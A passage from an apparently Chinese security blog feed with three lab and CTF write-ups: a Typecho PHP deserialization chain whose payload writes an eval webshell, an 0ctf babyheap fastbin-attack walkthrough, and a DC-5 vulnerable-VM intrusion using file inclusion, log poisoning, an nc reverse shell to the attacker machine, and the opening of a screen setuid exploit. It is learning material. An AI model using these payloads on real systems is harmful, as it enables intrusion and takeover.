class="line"><span class="class"></span>&#123;</span><br><span class="line"> <span class="keyword">private</span> $_filter=<span class="keyword">array</span>(<span class="string">"assert"</span>);</span><br><span class="line"> <span class="keyword">private</span> $_params=<span class="keyword">array</span>(<span class="string">"screenName"</span>=&gt;<span class="string">"file_put_contents('jrxnm.php', '&lt;?php eval(\$_GET[jrxnm]);');"</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Feed</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">private</span> $_items = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">private</span> $_type = <span class="string">'RSS 2.0'</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">$item[<span class="string">'author'</span>] = <span class="keyword">new</span> Typecho_Request();</span><br><span class="line"><span class="keyword">$this</span>-&gt;_items[<span class="number">0</span>] = $item;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">$abc = <span class="keyword">new</span> Typecho_Feed();</span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize(<span class="keyword">array</span>(<span class="string">"adapter"</span>=&gt;$abc,<span class="string">"prefix"</span>=&gt;<span class="string">"_typecho"</span>)));</span><br></pre></td></tr></table></figure></p><p>序列化一个数组之后作为cookie传入，关键代码：</p><p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/typ1.png" alt=""></p><p>此处<code>$config</code>接收cookie中的参数，那么<code>$config</code>此时就是一个数组:</p><p><code>$config = array(&quot;adapter&quot;=&gt;$abc, &quot;prefix&quot;=&gt;&quot;_typecho&quot;)</code></p><p>其中<code>adapter</code>键对应的是一个对象。</p><p><img src="https://i.loli.net/2019/08/11/B4SNL1EYOhpzu9r.png" alt="typ3.png"></p><p>然后<code>$config</code>的两个键值对应的value都作为参数进入了一个类。</p><p>查看该类的构造方法发现存在字符串拼接：</p><p><img src="https://i.loli.net/2019/08/11/vfe6cAPLjRZNr3o.png" alt="typ4.png"></p><p>那么查找<code>__toString()</code>魔术方法，我们发现在<code>Feed.php</code>文件中的一个类：Typecho_Feed</p><p><img src="https://i.loli.net/2019/08/11/D1mYMOHZiAgNwlt.png" alt="typ7.png"></p><p><code>$item['author']-&gt;screenName</code>如果$item['author'] 是一个对象，且不存在screenName属性时，会自动调用__get魔法函数。</p><p>于是我们想要在实例化Typecho_Db类的时候，调用<code>Typecho_Feed</code>类中的<code>__toString</code>方法</p><p>此时继续寻找<code>__get</code>方法：</p><p>在Request.php文件中有一个类Typecho_Request中的<code>__get</code>方法如下：</p><p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 获取实际传递参数(magic)</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string $key 指定参数</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> void</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get($key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>继续分析get方法：</p><p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">($key, $default = NULL)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $value = $default;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;_params[$key]):</span><br><span class="line">            $value = <span class="keyword">$this</span>-&gt;_params[$key];</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="keyword">isset</span>($_GET[$key]):</span><br><span class="line">            $value = $_GET[$key];</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="keyword">isset</span>($_POST[$key]):</span><br><span class="line">            $value = $_POST[$key];</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="keyword">isset</span>($_COOKIE[$key]):</span><br><span class="line">            $value = $_COOKIE[$key];</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            $value = $default;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $value = is_array($value) || strlen($value) &gt; <span class="number">0</span> ? $value : $default;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;_filter ? <span class="keyword">$this</span>-&gt;_applyFilter($value) : $value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>如果<code>$this-&gt;_filter</code>，就会调用<code>_applyFilter</code>方法：</p><p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">_applyFilter</span><span class="params">($value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;_filter) &#123;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;_filter <span class="keyword">as</span> $filter) &#123;</span><br><span class="line">            $value = is_array($value) ? array_map($filter, $value) :</span><br><span class="line">            call_user_func($filter, $value);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">$this</span>-&gt;_filter = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">return</span> $value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>此时终于看到了<code>call_user_func</code>方法，函数名是<code>this-&gt;_filter</code></p><h2>再看一道反序列化</h2><p>``php&lt;?phpclass Template{public $cacheFile = '/tmp/cachefile';public $template = '&lt;div&gt;welcome back %s &lt;/div&gt;';</p><pre><code>public function __construct($data=null){    $data=$this-&gt;lodaData($data);    $this-&gt;render($data);}public function loadData($data){    if(substr($data, 0, 2) !== '0:' &amp;&amp; !preg_match('/0:\d:\/', $data)){        return unserialize($data);    }    return [];}public function createCache($file=null, $tpl=null){    $file = $file ?? $this-&gt;cacheFile;    $tpl = $tpl ?? $this-&gt;template;    file_put_contents($file, $tpl);}public function render($data){    echo sprintf($this-&gt;template, htmlspecialchars($data['name']));}public function __destruct(){    $this-&gt;createCache();}</code></pre><p>}</p><p>new Template($_COOKIE['data']);</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">这道题也是反序列化的应用，利用思路很清晰就是通过`__destruct`调用`createCache`写入一个webshell</span><br><span class="line"></span><br><span class="line">重点在于这里：</span><br><span class="line"></span><br><span class="line">```php</span><br><span class="line">    public function loadData($data)&#123;</span><br><span class="line">        if(substr($data, 0, 2) !== &apos;0:&apos; &amp;&amp; !preg_match(&apos;/0:\d:\/&apos;, $data))&#123;</span><br><span class="line">            return unserialize($data);</span><br><span class="line">        &#125;</span><br><span class="line">        return [];</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>如果绕过这个if判断，这里需要分析一下php的源码：在'O:',后面可以增加'+'，用来绕过正则判断。</p><h2>参考</h2><p><a href="https://www.freebuf.com/articles/web/209975.html" target="_blank" rel="noopener">PHP反序列化漏洞简介及相关技巧小结</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;在freebuf上看到了一篇新的php反序列化的文章，借此继续分析一下php反序列化。&lt;/p&gt;
&lt;p&gt;文章中的代码如下：&lt;/p&gt;
&lt;p&gt;&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;spa
      
    
    </summary>
    
    
      <category term="php" scheme="https://prontosil.club/tags/php/"/>
    
      <category term="反序列化" scheme="https://prontosil.club/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>0ctfbabyheap</title>
    <link href="https://prontosil.club/2019/08/10/0ctfbabyheap/"/>
    <id>https://prontosil.club/2019/08/10/0ctfbabyheap/</id>
    <published>2019-08-10T12:30:06.000Z</published>
    <updated>2019-08-10T12:54:46.781Z</updated>
    
    <content type="html"><![CDATA[<p>被0ctf的这道题目搞了好久。记录一下</p><p>思路是使用fastbin attack，how2heap上有一个栗子可以分析一下</p><p>先申请5个chunk，free之后使得 <code>fastbin[0]-&gt;idx1-&gt;idx2-&gt;NULL</code></p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">allocate(<span class="number">0x10</span>)  <span class="comment"># idx 0, 0x00</span></span><br><span class="line">allocate(<span class="number">0x10</span>)  <span class="comment"># idx 1, 0x20</span></span><br><span class="line">allocate(<span class="number">0x10</span>)  <span class="comment"># idx 2, 0x40</span></span><br><span class="line">allocate(<span class="number">0x10</span>)  <span class="comment"># idx 3, 0x60</span></span><br><span class="line">allocate(<span class="number">0x80</span>)  <span class="comment"># idx 4, 0x80</span></span><br><span class="line"><span class="comment"># free idx 1, 2, fastbin[0]-&gt;idx1-&gt;idx2-&gt;NULL</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br></pre></td></tr></table></figure></p><p>此时的bins</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x5619d93ea020 —▸ 0x5619d93ea040 ◂— 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br></pre></td></tr></table></figure></p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/40gx 0x5619d93ea000</span><br><span class="line">0x5619d93ea000: 0x0000000000000000      0x0000000000000021 ---&gt;idx0</span><br><span class="line">0x5619d93ea010: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5619d93ea020: 0x0000000000000000      0x0000000000000021 ---&gt;idx1</span><br><span class="line">0x5619d93ea030: 0x00005619d93ea040      0x0000000000000000</span><br><span class="line">0x5619d93ea040: 0x0000000000000000      0x0000000000000021 ---&gt;idx2</span><br><span class="line">0x5619d93ea050: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5619d93ea060: 0x0000000000000000      0x0000000000000021 ---&gt;idx3</span><br><span class="line">0x5619d93ea070: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5619d93ea080: 0x0000000000000000      0x0000000000000091 ---&gt;idx4</span><br><span class="line">0x5619d93ea090: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5619d93ea0a0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5619d93ea0b0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5619d93ea0c0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5619d93ea0d0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5619d93ea0e0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5619d93ea0f0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5619d93ea100: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5619d93ea110: 0x0000000000000000      0x0000000000020ef1</span><br><span class="line">0x5619d93ea120: 0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure></p><p>然后我们修改idx2的指针,通过fill idx0造成溢出，同时由于内存对齐，可以肯定idx4的指针最后肯定是0x80</p><p>修改后如下：</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/40gx 0x560e5e91c000</span><br><span class="line">0x560e5e91c000: 0x0000000000000000      0x0000000000000021 ---&gt;idx0</span><br><span class="line">0x560e5e91c010: 0x6161616161616161      0x6161616161616161</span><br><span class="line">0x560e5e91c020: 0x0000000000000000      0x0000000000000021 ---&gt;idx1</span><br><span class="line">0x560e5e91c030: 0x0000560e5e91c080      0x0000000000000000 </span><br><span class="line">0x560e5e91c040: 0x0000000000000000      0x0000000000000021 ---&gt;idx2</span><br><span class="line">0x560e5e91c050: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x560e5e91c060: 0x0000000000000000      0x0000000000000021 ---&gt;idx3</span><br><span class="line">0x560e5e91c070: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x560e5e91c080: 0x0000000000000000      0x0000000000000091 ---&gt;idx4</span><br><span class="line">0x560e5e91c090: 0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure></p><p>此时的bins指向：</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x560e5e91c020 —▸ 0x560e5e91c080 ◂— 0x0 (idx2--&gt;idx4)</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br></pre></td></tr></table></figure></p><p>如果再连续申请两个chunk，那么第一次是idx2，第二次就是idx4但是malloc有一个check机制，如果两个fastbin的大小不一样就会报错，所以我们再借用一下idx3，让其溢出到idx4，修改idx4的大小</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/40gx 0x5573e66cd000 </span><br><span class="line">0x5573e66cd000: 0x0000000000000000      0x0000000000000021 ---&gt;idx0</span><br><span class="line">0x5573e66cd010: 0x6161616161616161      0x6161616161616161 </span><br><span class="line">0x5573e66cd020: 0x0000000000000000      0x0000000000000021 ---&gt;idx1</span><br><span class="line">0x5573e66cd030: 0x00005573e66cd080      0x0000000000000000</span><br><span class="line">0x5573e66cd040: 0x0000000000000000      0x0000000000000021 ---&gt;idx2</span><br><span class="line">0x5573e66cd050: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5573e66cd060: 0x0000000000000000      0x0000000000000021 ---&gt;idx3</span><br><span class="line">0x5573e66cd070: 0x6161616161616161      0x6161616161616161</span><br><span class="line">0x5573e66cd080: 0x0000000000000000      0x0000000000000021 ---&gt;idx4</span><br><span class="line">0x5573e66cd090: 0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure></p><p>此时idx4的大小已经被修改了，于是可以申请了</p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">allocate(<span class="number">0x10</span>)  <span class="comment"># idx 1</span></span><br><span class="line">allocate(<span class="number">0x10</span>)  <span class="comment"># idx 2, which point to idx4's location</span></span><br></pre></td></tr></table></figure></p><p>之后，如果我们想要将 idx 4 放到 unsorted bin 中的话，先需要把它的大小改回来，同时为了防止其与 top chunk 合并，我们需要再次申请一个 chunk。此后再释放 idx4 就会进入 unsorted bin 中去了。</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/40gx 0x559b5b9a5000</span><br><span class="line">0x559b5b9a5000: 0x0000000000000000      0x0000000000000021 ---&gt;idx0</span><br><span class="line">0x559b5b9a5010: 0x6161616161616161      0x6161616161616161 </span><br><span class="line">0x559b5b9a5020: 0x0000000000000000      0x0000000000000021 ---&gt;idx1</span><br><span class="line">0x559b5b9a5030: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x559b5b9a5040: 0x0000000000000000      0x0000000000000021 ---&gt;idx2</span><br><span class="line">0x559b5b9a5050: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x559b5b9a5060: 0x0000000000000000      0x0000000000000021 ---&gt;idx3</span><br><span class="line">0x559b5b9a5070: 0x6161616161616161      0x6161616161616161</span><br><span class="line">0x559b5b9a5080: 0x0000000000000000      0x0000000000000091 ---&gt;idx4</span><br><span class="line">0x559b5b9a5090: 0x00007fa9e254eb78      0x00007fa9e254eb78</span><br><span class="line">0x559b5b9a50a0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x559b5b9a50b0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x559b5b9a50c0: 0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure></p><p>此时dump(2)就可以得到unsorted bin 的地址了。</p><p>此时的bins如下</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x559b5b9a5080 —▸ 0x7fa9e254eb78 (main_arena+88) ◂— 0x559b5b9a5080</span><br><span class="line">smallbins</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;被0ctf的这道题目搞了好久。记录一下&lt;/p&gt;
&lt;p&gt;思路是使用fastbin attack，how2heap上有一个栗子可以分析一下&lt;/p&gt;
&lt;p&gt;先申请5个chunk，free之后使得 &lt;code&gt;fastbin[0]-&amp;gt;idx1-&amp;gt;idx2-&amp;gt;NUL
      
    
    </summary>
    
      <category term="pwn" scheme="https://prontosil.club/categories/pwn/"/>
    
    
      <category term="heap" scheme="https://prontosil.club/tags/heap/"/>
    
      <category term="onegadget" scheme="https://prontosil.club/tags/onegadget/"/>
    
  </entry>
  
  <entry>
    <title>DC靶机渗透</title>
    <link href="https://prontosil.club/2019/08/09/DC%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/"/>
    <id>https://prontosil.club/2019/08/09/DC靶机渗透/</id>
    <published>2019-08-09T08:12:11.000Z</published>
    <updated>2019-08-13T01:59:08.354Z</updated>
    
    <content type="html"><![CDATA[<h2>DC 5</h2><p>之前一直没能够确认靶机的ip地址，其实只需要将网络连接模式修改为NAT模式重启一下就行了</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># root @ kali in ~ [4:06:38] </span><br><span class="line">$ arp-scan 192.168.41.0/24</span><br><span class="line">Interface: eth0, datalink type: EN10MB (Ethernet)</span><br><span class="line">Starting arp-scan 1.9.5 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.41.100:50:56:c0:00:08VMware, Inc.</span><br><span class="line">192.168.41.200:50:56:e0:f7:aaVMware, Inc.</span><br><span class="line">192.168.41.16600:0c:29:d7:ef:a4VMware, Inc.</span><br><span class="line">192.168.41.16700:0c:29:fd:e8:73VMware, Inc. ---&gt; DC5靶机</span><br><span class="line">192.168.41.25400:50:56:f5:fb:f6VMware, Inc.</span><br><span class="line"></span><br><span class="line">5 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.5: 256 hosts scanned in 2.346 seconds (109.12 hosts/sec). 5 responded</span><br></pre></td></tr></table></figure></p><p>masscan扫出了几个端口：</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># root @ kali in ~ [4:09:46] </span><br><span class="line">$ masscan -p0-65535 192.168.41.167 --rate=1000000</span><br><span class="line"></span><br><span class="line">Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-08-09 08:10:19 GMT</span><br><span class="line"> -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth</span><br><span class="line">Initiating SYN Stealth Scan</span><br><span class="line">Scanning 1 hosts [65536 ports/host]</span><br><span class="line">Discovered open port 80/tcp on 192.168.41.167                                  </span><br><span class="line">Discovered open port 111/tcp on 192.168.41.167                                 </span><br><span class="line">Discovered open port 33188/tcp on 192.168.41.167</span><br></pre></td></tr></table></figure></p><p>然后上nmap扫服务</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># root @ kali in ~ [4:10:42] </span><br><span class="line">$ nmap -p80,111,33188 -sV -T4 192.168.41.167</span><br><span class="line">Starting Nmap 7.70 ( https://nmap.org ) at 2019-08-09 04:15 EDT</span><br><span class="line">Stats: 0:00:11 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan</span><br><span class="line">Service scan Timing: About 66.67% done; ETC: 04:15 (0:00:06 remaining)</span><br><span class="line">Nmap scan report for 192.168.41.167</span><br><span class="line">Host is up (0.00042s latency).</span><br><span class="line"></span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">80/tcp    open  http    nginx 1.6.2</span><br><span class="line">111/tcp   open  rpcbind 2-4 (RPC #100000)</span><br><span class="line">33188/tcp open  status  1 (RPC #100024)</span><br><span class="line">MAC Address: 00:0C:29:FD:E8:73 (VMware)</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 11.63 seconds</span><br></pre></td></tr></table></figure></p><p>访问原始网页：</p><p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/dc5.png" alt=""></p><p><code>dirsearch.py</code>似乎没有发现什么</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Target: http://192.168.41.167                                                                                           </span><br><span class="line">[16:24:35] Starting:</span><br><span class="line">[16:24:35] 400 -  172B  - /%2e%2e/google.com</span><br><span class="line">[16:24:42] 301 -  184B  - /css  -&gt;  http://192.168.41.167/css/</span><br><span class="line">[16:24:44] 301 -  184B  - /images  -&gt;  http://192.168.41.167/images/</span><br><span class="line">[16:24:44] 200 -    4KB - /index.php</span><br></pre></td></tr></table></figure></p><p>看了师傅们的提示，发现footer.php很有趣每次刷新数字都会变化<img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/dc5-0.png" alt=""></p><p>同时发现在 <code>http://192.168.41.167/thankyou.php</code>页面也有这种效果，于是猜想是不是本地文件包含漏洞</p><p>访问<code>http://192.168.41.167/thankyou.php?file=/etc/passwd</code>，页面回显了！</p><p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/dc5-1.png" alt=""></p><p>同时该主机使用的是nginx服务，于是可以写一个shell到日志中并且包含这个文件</p><p>写入webshell，注意这里使用的是passthru函数</p><blockquote><p>同 exec() 函数类似， passthru() 函数 也是用来执行外部命令（command）的。 当所执行的 Unix 命令输出二进制数据， 并且需要直接传送到浏览器的时候， 需要用此函数来替代 exec() 或 system() 函数。 常用来执行诸如 pbmplus 之类的可以直接输出图像流的命令。 通过设置 Content-type 为 image/gif， 然后调用 pbmplus 程序输出 gif 文件， 就可以从 PHP 脚本中直接输出图像到浏览器。</p></blockquote><p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/dc5-2.png" alt=""></p><p>kali监听一个端口然后访问如下路由去包含文件并且弹shell<code>http://192.168.41.167/thankyou.php?file=/var/log/nginx/access.log&amp;cmd=nc%20192.168.41.165%202333%20-c%20/bin/bash</code></p><p>核心命令<code>nc 192.168.41.165 -c /bin/bash</code></p><p>此时的权限是<code>www-data</code><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/dc5-3.png" alt=""></p><p>接下来看如何提权</p><p>上提权辅助脚本<a href="https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh" target="_blank" rel="noopener">链接</a></p><p>发现有这个文件</p><p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/dc5-4.png" alt=""></p><p>exploit-db上搜一下exp：</p><p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># screenroot.sh</span></span><br><span class="line"><span class="comment"># setuid screen v4.5.0 